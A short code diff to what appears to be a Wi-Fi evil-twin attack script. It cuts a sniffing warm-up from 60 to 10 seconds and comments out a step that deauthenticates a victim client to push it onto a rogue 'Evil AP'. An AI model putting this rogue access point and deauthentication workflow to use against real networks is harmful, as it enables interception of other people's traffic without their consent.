@@ -45,7 +45,7 @@ def main():
     sniffer = scan.start_sniff(iface)
 
     # Warm-up phase: 60 seconds
-    warmup = 60
+    warmup = 10
     print(f"Gathering data for {warmup}s before menu...")
     time.sleep(warmup)
 
@@ -88,7 +88,7 @@ def main():
                 procs = attack.start_attack(ap_iface, ap_info)
 
                 # # 4) Deauth the victim until they associate to your Evil AP
-                attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
+                # attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
                 print(f"Deauthenticating {client_mac} from {bssid}…")
 
                 # 5) Stop sniffing now that the victim is “in”
